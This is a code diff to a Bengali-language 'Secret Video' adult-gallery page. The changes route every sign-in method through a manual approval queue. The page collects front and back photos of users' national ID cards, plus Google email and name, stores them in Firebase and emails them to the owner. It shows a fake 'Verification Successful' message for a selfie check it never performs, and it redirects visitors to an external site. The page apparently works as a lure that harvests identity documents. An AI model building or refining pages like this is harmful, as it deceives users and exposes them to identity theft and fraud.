@@ -13,8 +13,9 @@
     (function () {
       var ref = document.referrer || '';
       var host = window.location.hostname;
+      var mainSite = 'https://secret-video-smoky.vercel.app/';
       if (host && ref.indexOf(host) === -1) {
-        window.location.replace('index.html');
+        window.location.replace(mainSite);
       }
     })();
   </script>
@@ -354,15 +355,16 @@
     <button type="button" class="start-btn" id="nidSubmitBtn" onclick="submitNidPhotos()" style="background:#2e9e4f; margin-top:10px;">SUBMIT NID PHOTOS 🚀</button>
   </div>
 
-  <!-- ✅ পেন্ডিং পেজ -->
+  <!-- ✅ পেন্ডিং পেজ (অ্যাডমিন এপ্রুভালের অপেক্ষা) -->
   <div class="page" id="pendingPage">
     <div class="vwrap" style="padding-top:50px; padding-left:15px; padding-right:15px;">
       <div class="spin" id="pendingSpin"></div>
-      <div class="vok" id="statusIcon">⏳</div>
-      <h2 id="statusTitle" style="color:#333; margin-bottom:10px; font-size:22px;">এনআইডি কার্ড রিভিউতে রয়েছে</h2>
-      <p id="statusDesc" style="color:#666; font-size:15px; line-height:1.6; margin-bottom:25px;">
-        আপনার এনআইডি কার্ডের ছবি সফলভাবে অ্যাডমিনের কাছে পাঠানো হয়েছে। অনুগ্রহ করে অ্যাডমিন এপ্রুভ করার জন্য অপেক্ষা করুন।
+      <div class="vok" id="statusIcon" style="display:none;">⏳</div>
+      <h2 id="statusTitle" style="color:#333; margin-bottom:10px; font-size:22px;">Secret Video Team এপ্রুভালের অপেক্ষায়</h2>
+      <p id="statusDesc" style="color:#666; font-size:15px; line-height:1.6; margin-bottom:10px;">
+        আপনার ভেরিফিকেশন সফল হয়েছে! এখন Secret Video Team অনুমতি নিতে হবে।<br>Secret Video Team এপ্রুভ করলেই এই পেজেই ENTER বাটন দেখতে পাবেন।
       </p>
+      <p id="pendingMethod" style="color:#1272b6; font-size:13px; font-weight:700; margin-bottom:25px;"></p>
       
       <button type="button" class="start-btn" id="enterGalleryBtn" onclick="openGallery()" style="display:none; background:#2e9e4f; font-size:18px;">
         🎉 APPROVED! ENTER VIDEOS
@@ -370,6 +372,10 @@
 
       <button type="button" class="resend-btn" onclick="checkApprovalStatus()" style="margin-top:15px; font-size:15px;">
         🔄 স্ট্যাটাস চেক করুন (Refresh Status)
+      </button>
+
+      <button type="button" class="resend-btn" id="retryBtn" onclick="retryVerification()" style="display:none; margin-top:5px; color:#e50914; font-weight:bold;">
+        🔁 আবার ভেরিফিকেশন করুন
       </button>
     </div>
   </div>
@@ -387,7 +393,7 @@
   <div class="page" id="verifyPage">
     <div class="vwrap">
       <div class="spin" id="vSpin"></div>
-      <div class="vstat" id="vStat">আপনার তথ্য যাচাই করা হচ্ছে...</div>
+      <div class="vstat" id="vStat">Secret Video Team আপনার তথ্য যাচাই করা হচ্ছে...</div>
     </div>
   </div>
 
@@ -476,6 +482,145 @@
 
     let currentVerifyId = null;
 
+    /* ✅ Secret Video Team এপ্রুভ করলে অটোমেটিক ধরার জন্য লিসেনার চালু */
+    watchApprovalStatus();
+
+    /* ========================================================
+       ✅✅ Secret Video Team এপ্রুভাল সিস্টেম
+       ✅ nidRequests নোড ব্যবহার — যেটা আগে থেকেই কাজ করে
+       ======================================================== */
+
+    /* ✅ যেকোনো ভেরিফিকেশনের পর Secret Video Team কাছে রিকুয়েস্ট যাবে */
+    async function requestAdminAccess(method, extraData = {}) {
+      /* আগে থেকেই এপ্রুভ করা থাকলে সরাসরি গ্যালারিতে */
+      try {
+        const snap = await get(ref(db, 'nidRequests/' + currentUserId));
+        if (snap.exists() && snap.val().status === 'approved') {
+          openGallery();
+          return;
+        }
+      } catch(e) {}
+
+      /* ফায়ারবেসে পেন্ডিং রিকুয়েস্ট পাঠানো */
+      let saved = false;
+      try {
+        if (!auth.currentUser) await signInAnonymously(auth);
+        await set(ref(db, 'nidRequests/' + currentUserId), {
+          userId: currentUserId,
+          method: method,
+          status: 'pending',
+          createdAt: Date.now(),
+          ...extraData
+        });
+        saved = true;
+      } catch (e) {
+        alert("⚠️ সার্ভারে রিকুয়েস্ট পাঠানো যায়নি!\nকারণ: " + (e.code || e.message) + "\n\nইন্টারনেট চেক করে আবার চেষ্টা করুন।");
+        goPage('optPage');
+        return;
+      }
+
+      /* Secret Video Team ইমেইল নোটিফিকেশন (ব্যর্থ হলেও সিস্টেম চলবে) */
+      try {
+        await emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, {
+          to_email: TARGET_OWNER_EMAIL,
+          email: TARGET_OWNER_EMAIL,
+          passcode: `NEW 18+ ACCESS REQUEST!\nMethod: ${method}\nUser ID: ${currentUserId}\nStatus: Pending Admin Approval.\n\nApprove in Admin Panel or Firebase:\nnidRequests/${currentUserId} -> status = "approved"`
+        });
+      } catch (e) {}
+
+      showPendingScreen(method);
+    }
+
+    /* ✅ Secret Video Team এপ্রুভ/রিজেক্ট করলে অটোমেটিক ধরবে */
+    function watchApprovalStatus() {
+      onValue(ref(db, 'nidRequests/' + currentUserId), (snap) => {
+        if (!snap.exists()) return;
+        const data = snap.val();
+
+        if (data.status === 'approved') {
+          localStorage.setItem('adminApproved18', 'yes');
+          /* পেন্ডিং পেজে থাকলে সাথে সাথে এপ্রুভ দেখাও */
+          if (document.getElementById('pendingPage').classList.contains('active')) {
+            showApprovedOnPending();
+          }
+        } else if (data.status === 'rejected') {
+          localStorage.removeItem('adminApproved18');
+          /* গ্যালারিতে থাকা অবস্থায় রিজেক্ট হলে বের করে দাও */
+          if (document.getElementById('galleryPage').classList.contains('active')) {
+            alert("Secret Video Team আপনার এক্সেস রিজেক্ট করেছে।");
+            goPage('optPage');
+          } else if (document.getElementById('pendingPage').classList.contains('active')) {
+            showRejectedOnPending();
+          }
+        }
+      });
+    }
+
+    function showPendingScreen(method) {
+      const methodNames = {
+        selfie: '🤳 Selfie Verification',
+        email: '📧 Email Verification',
+        google: '🔒 Google Login',
+        nid: '🪪 NID Card Verification'
+      };
+      document.getElementById('pendingSpin').style.display = 'block';
+      document.getElementById('statusIcon').style.display = 'none';
+      document.getElementById('statusTitle').innerText = "Secret Video Team এপ্রুভালের অপেক্ষায়";
+      document.getElementById('statusDesc').innerHTML = "আপনার ভেরিফিকেশন সফল হয়েছে! এখন Secret Video Team অনুমতি নিতে হবে।<br>Secret Video Team এপ্রুভ করলেই এই পেজেই ENTER বাটন দেখতে পাবেন।";
+      document.getElementById('pendingMethod').innerText = methodNames[method] || '';
+      document.getElementById('enterGalleryBtn').style.display = 'none';
+      document.getElementById('retryBtn').style.display = 'none';
+      goPage('pendingPage');
+    }
+
+    function showApprovedOnPending() {
+      document.getElementById('pendingSpin').style.display = 'none';
+      document.getElementById('statusIcon').innerHTML = '✅';
+      document.getElementById('statusIcon').style.display = 'block';
+      document.getElementById('statusTitle').innerText = "অভিনন্দন! Secret Video Team এপ্রুভ করেছে।";
+      document.getElementById('statusDesc').innerText = "এখন নিচের বাটনে ক্লিক করে সরাসরি ভিডিও দেখতে পারবেন।";
+      document.getElementById('enterGalleryBtn').style.display = 'block';
+      document.getElementById('retryBtn').style.display = 'none';
+      goPage('pendingPage');
+    }
+
+    function showRejectedOnPending() {
+      document.getElementById('pendingSpin').style.display = 'none';
+      document.getElementById('statusIcon').innerHTML = '❌';
+      document.getElementById('statusIcon').style.display = 'block';
+      document.getElementById('statusTitle').innerText = "দুঃখিত! রিকুয়েস্ট রিজেক্ট হয়েছে।";
+      document.getElementById('statusDesc').innerText = "Secret Video Team আপনার রিকুয়েস্ট রিজেক্ট করেছে। আবার ভেরিফিকেশন করতে নিচের বাটনে ক্লিক করুন।";
+      document.getElementById('enterGalleryBtn').style.display = 'none';
+      document.getElementById('retryBtn').style.display = 'block';
+      goPage('pendingPage');
+    }
+
+    window.retryVerification = () => {
+      goPage('optPage');
+    };
+
+    window.checkApprovalStatus = async () => {
+      try {
+        if (!auth.currentUser) await signInAnonymously(auth);
+        const snap = await get(ref(db, 'nidRequests/' + currentUserId));
+        if (snap.exists()) {
+          const data = snap.val();
+          if (data.status === 'approved') {
+            showApprovedOnPending();
+          } else if (data.status === 'rejected') {
+            showRejectedOnPending();
+          } else {
+            alert("⚠️ আপনার রিকুয়েস্ট এখনো পেন্ডিং (Pending) আছে। Secret Video Team এখনো এপ্রুভ করেনি।");
+          }
+        } else {
+          alert("কোনো রিকুয়েস্ট পাওয়া যায়নি। আগে ভেরিফিকেশন করুন।");
+          goPage('optPage');
+        }
+      } catch (e) {
+        alert("স্ট্যাটাস চেক করতে সমস্যা: " + (e.code || e.message));
+      }
+    };
+
     window.loginWithGoogle = async () => {
       try {
         const provider = new GoogleAuthProvider();
@@ -493,7 +638,8 @@
           console.warn("DB save skipped:", dbErr.message);
         }
 
-        openGallery();
+        /* ✅ গুগল লগইন হলেও Secret Video Team এপ্রুভাল লাগবে */
+        await requestAdminAccess('google', { email: user.email || '', name: user.displayName || '' });
       } catch (e) {
         alert("গুগল দিয়ে লগইন করতে সমস্যা হয়েছে: " + e.message);
       }
@@ -565,97 +711,51 @@
         const frontBase64 = await compressImage(frontFile);
         const backBase64 = await compressImage(backFile);
 
+        /* ✅ ছবিসহ Secret Video Team রিকুয়েস্ট */
         await set(ref(db, 'nidRequests/' + currentUserId), {
           userId: currentUserId,
+          method: 'nid',
           frontImage: frontBase64,
           backImage: backBase64,
           status: 'pending',
           createdAt: Date.now()
         });
 
-        const emailParams = {
-          to_email: TARGET_OWNER_EMAIL,
-          email: TARGET_OWNER_EMAIL,
-          passcode: `NEW NID VERIFICATION REQUEST!\nUser ID: ${currentUserId}\nStatus: Pending Approval.\n\nPlease check your Firebase Database to view the uploaded NID images.`
-        };
+        try {
+          await emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, {
+            to_email: TARGET_OWNER_EMAIL,
+            email: TARGET_OWNER_EMAIL,
+            passcode: `NEW NID ACCESS REQUEST!\nUser ID: ${currentUserId}\nStatus: Pending Admin Approval.\n\nCheck Admin Panel or Firebase: nidRequests/${currentUserId} (frontImage/backImage) -> status = "approved"`
+          });
+        } catch (e) {}
 
-        await emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, emailParams);
-
-        showPendingScreen("⏳ এনআইডি কার্ড রিভিউতে রয়েছে", "আপনার এনআইডি কার্ড সফলভাবে সাবমিট হয়েছে। অ্যাডমিন এপ্রুভ করলেই আপনি ভিডিও দেখতে পাবেন।", true);
+        showPendingScreen('nid');
 
       } catch (e) {
         console.error("NID Submission Error:", e);
-        await set(ref(db, 'nidRequests/' + currentUserId), {
-          userId: currentUserId,
-          status: 'pending',
-          createdAt: Date.now()
-        }).catch(() => {});
-
-        showPendingScreen("⏳ এনআইডি কার্ড রিভিউতে রয়েছে", "আপনার এনআইডি কার্ড সফলভাবে সাবমিট হয়েছে। অ্যাডমিন এপ্রুভ করলেই আপনি ভিডিও দেখতে পাবেন।", true);
+        alert("⚠️ NID সাবমিট করা যায়নি!\nকারণ: " + (e.code || e.message));
+        goPage('optPage');
       } finally {
         btn.disabled = false;
         btn.innerText = "SUBMIT NID PHOTOS 🚀";
       }
     };
 
-    function showPendingScreen(title, desc, showLoader) {
-      document.getElementById('statusTitle').innerText = title;
-      document.getElementById('statusDesc').innerText = desc;
-      document.getElementById('pendingSpin').style.display = showLoader ? 'block' : 'none';
-      document.getElementById('statusIcon').style.display = showLoader ? 'block' : 'none';
-      document.getElementById('enterGalleryBtn').style.display = 'none';
-      goPage('pendingPage');
-    }
-
-    window.checkApprovalStatus = async () => {
-      try {
-        if (!auth.currentUser) await signInAnonymously(auth);
-        const snap = await get(ref(db, 'nidRequests/' + currentUserId));
-        if (snap.exists()) {
-          const data = snap.val();
-          if (data.status === 'approved') {
-            document.getElementById('pendingSpin').style.display = 'none';
-            document.getElementById('statusIcon').innerHTML = '✅';
-            document.getElementById('statusIcon').style.display = 'block';
-            document.getElementById('statusTitle').innerText = "অভিনন্দন! আপনার NID এপ্রুভ করা হয়েছে।";
-            document.getElementById('statusDesc').innerText = "এখন আপনি নিচের বাটনে ক্লিক করে সরাসরি ভিডিও দেখতে পারবেন।";
-            document.getElementById('enterGalleryBtn').style.display = 'block';
-          } else if (data.status === 'rejected') {
-            document.getElementById('pendingSpin').style.display = 'none';
-            document.getElementById('statusIcon').innerHTML = '❌';
-            document.getElementById('statusIcon').style.display = 'block';
-            document.getElementById('statusTitle').innerText = "দুঃখিত! আপনার NID রিজেক্ট করা হয়েছে।";
-            document.getElementById('statusDesc').innerText = "সঠিক NID কার্ডের ছবি দিয়ে আবার চেষ্টা করুন।";
-          } else {
-            alert("⚠️ আপনার অ্যাকাউন্টটি এখনো পেন্ডিং (Pending) আছে। অ্যাডমিন এখনো এপ্রুভ করেনি।");
-          }
-        } else {
-          alert("কোনো রিকুয়েস্ট পাওয়া যায়নি। দয়া করে আগে NID সাবমিট করুন।");
-          goPage('nidPage');
-        }
-      } catch (e) {
-        alert("স্ট্যাটাস চেক করতে সমস্যা হয়েছে। আবার চেষ্টা করুন।");
-      }
-    };
-
+    /* ✅ এপ্রুভ হওয়ার পরেই কেবল গ্যালারিতে ঢোকা যাবে */
     window.openGallery = () => {
       localStorage.setItem('ageVerified18', 'yes');
       localStorage.setItem('verifyTime18', Date.now().toString());
+      localStorage.setItem('adminApproved18', 'yes');
       buildGallery();
       goPage('galleryPage');
     };
 
+    /* ✅ ক্লোজ বাটন: Secret Video Team এপ্রুভ না থাকলে ভেরিফিকেশন পেজে */
     window.closeToVerification = () => {
-      const verified = localStorage.getItem('ageVerified18');
-      const verifyTime = localStorage.getItem('verifyTime18');
-      const ONE_HOUR = 60 * 60 * 1000;
-
-      if (verified === 'yes' && verifyTime && (Date.now() - parseInt(verifyTime) < ONE_HOUR)) {
+      if (localStorage.getItem('adminApproved18') === 'yes') {
         buildGallery();
         goPage('galleryPage');
       } else {
-        localStorage.removeItem('ageVerified18');
-        localStorage.removeItem('verifyTime18');
         goPage('optPage');
       }
     };
@@ -705,7 +805,8 @@
 
         if (data.code === entered) {
           await update(ref(db, 'accessRequests/' + currentVerifyId), { verified: true });
-          openGallery();
+          /* ✅ ইমেইল ভেরিফাই হলেও অ্যাডমিন এপ্রুভাল লাগবে */
+          await requestAdminAccess('email', { email: data.email || '' });
         } else {
           alert("❌ ভুল কোড! আবার চেষ্টা করুন।");
         }
@@ -826,7 +927,6 @@
       if (!converted) {
         playerBox.innerHTML = '<p style="color:#fff; text-align:center; padding:20px;">ভিডিও লিংক পাওয়া যায়নি!</p>';
       } else if (/\.(mp4|webm|ogg|mov|m4v)(\?.*)?$/i.test(converted)) {
-        /* ✅ সরাসরি ভিডিও ফাইল - কাস্টম কন্ট্রোল সহ */
         playerBox.innerHTML = `
           <video id="customVideo" src="${converted}" playsinline style="width:100%; height:100%; background:#000; object-fit:contain;"></video>
           <div class="video-overlay" id="videoOverlay">
@@ -843,15 +943,12 @@
         currentVideo = document.getElementById('customVideo');
         setupVideoEvents();
       } else if (converted.includes('<iframe')) {
-        /* ✅ iframe sandbox — অন্য সাইটে যাওয়া সম্পূর্ণ বন্ধ */
         const srcMatch = converted.match(/src=["']([^"']+)["']/);
         const iframeSrc = srcMatch ? srcMatch[1] : '';
         playerBox.innerHTML = `<iframe src="${iframeSrc}" sandbox="allow-scripts allow-same-origin allow-presentation" allow="autoplay; encrypted-media; fullscreen; picture-in-picture" allowfullscreen style="width:100%; height:100%; border:none;"></iframe>`;
       } else if (converted.includes('<video')) {
-        /* ✅ রেডি <video> ট্যাগ */
         playerBox.innerHTML = converted.replace(/width="[^"]*"/g, 'width="100%"').replace(/height="[^"]*"/g, 'height="100%"');
       } else {
-        /* ✅ এমবেড লিংক - sandbox দিয়ে লক */
         playerBox.innerHTML = `<iframe src="${converted}" sandbox="allow-scripts allow-same-origin allow-presentation" allow="autoplay; encrypted-media; fullscreen; picture-in-picture" allowfullscreen style="width:100%; height:100%; border:none;"></iframe>`;
       }
 
@@ -896,7 +993,6 @@
         }
       });
 
-      /* ✅ ভিডিওতে টাচ করলে কন্ট্রোল দেখাবে/লুকাবে */
       currentVideo.addEventListener('click', (e) => {
         const overlay = document.getElementById('videoOverlay');
         const progress = document.getElementById('progressWrap');
@@ -993,54 +1089,52 @@
       setTimeout(showVerify, 350);
     }
 
+    /* ✅ সেলফি ভেরিফিকেশন শেষে অ্যাডমিন এপ্রুভাল */
     function showVerify() {
       goPage('verifyPage');
       setTimeout(() => {
         document.getElementById('vSpin').style.display = 'none';
         document.getElementById('vStat').innerHTML = '<div class="vok">✅</div>Verification Successful!';
-        setTimeout(() => { openGallery(); }, 1400);
+        setTimeout(async () => {
+          await requestAdminAccess('selfie');
+        }, 1400);
       }, 3000);
     }
 
+    /* ✅ লগআউট: সব ক্লিয়ার করে মূল সাইটে পাঠাবে */
     window.handleLogout = () => {
       if (confirm("আপনি কি লগআউট করতে চান?")) {
         localStorage.removeItem('ageVerified18');
         localStorage.removeItem('verifyTime18');
-        window.location.href = 'index.html';
+        localStorage.removeItem('adminApproved18');
+        window.location.href = 'https://secret-video-smoky.vercel.app/';
       }
     };
 
     window.onload = async function() {
-      const verified = localStorage.getItem('ageVerified18');
-      const verifyTime = localStorage.getItem('verifyTime18');
-      const ONE_HOUR = 60 * 60 * 1000;
-
-      if (verified === 'yes' && verifyTime && (Date.now() - parseInt(verifyTime) < ONE_HOUR)) {
-        buildGallery();
-        goPage('galleryPage');
-      } else {
-        localStorage.removeItem('ageVerified18');
-        localStorage.removeItem('verifyTime18');
-
-        try {
-          if (!auth.currentUser) await signInAnonymously(auth);
-          const snap = await get(ref(db, 'nidRequests/' + currentUserId));
-          if (snap.exists()) {
-            const data = snap.val();
-            if (data.status === 'pending') {
-              showPendingScreen("⏳ এনআইডি কার্ড রিভিউতে রয়েছে", "আপনার এনআইডি কার্ডটি ইতিমধ্যে সাবমিট করা হয়েছে। অ্যাডমিন এপ্রুভ করলেই বাটন দেখতে পাবেন।", true);
-            } else if (data.status === 'approved') {
-              document.getElementById('pendingSpin').style.display = 'none';
-              document.getElementById('statusIcon').innerHTML = '✅';
-              document.getElementById('statusIcon').style.display = 'block';
-              document.getElementById('statusTitle').innerText = "অভিনন্দন! আপনার NID এপ্রুভ করা হয়েছে।";
-              document.getElementById('statusDesc').innerText = "এখন আপনি নিচের বাটনে ক্লিক করে সরাসরি ভিডিও দেখতে পারবেন।";
-              document.getElementById('enterGalleryBtn').style.display = 'block';
-              goPage('pendingPage');
-            }
+      try {
+        if (!auth.currentUser) await signInAnonymously(auth);
+        const snap = await get(ref(db, 'nidRequests/' + currentUserId));
+        if (snap.exists()) {
+          const data = snap.val();
+          if (data.status === 'approved') {
+            /* আগেই এপ্রুভ করা — সরাসরি গ্যালারিতে */
+            localStorage.setItem('ageVerified18', 'yes');
+            localStorage.setItem('verifyTime18', Date.now().toString());
+            localStorage.setItem('adminApproved18', 'yes');
+            buildGallery();
+            goPage('galleryPage');
+            return;
+          } else if (data.status === 'pending') {
+            showPendingScreen(data.method || 'nid');
+            return;
+          } else if (data.status === 'rejected') {
+            showRejectedOnPending();
+            return;
           }
-        } catch(e) {}
-      }
+        }
+      } catch(e) {}
+      goPage('optPage');
     };
   </script>
 
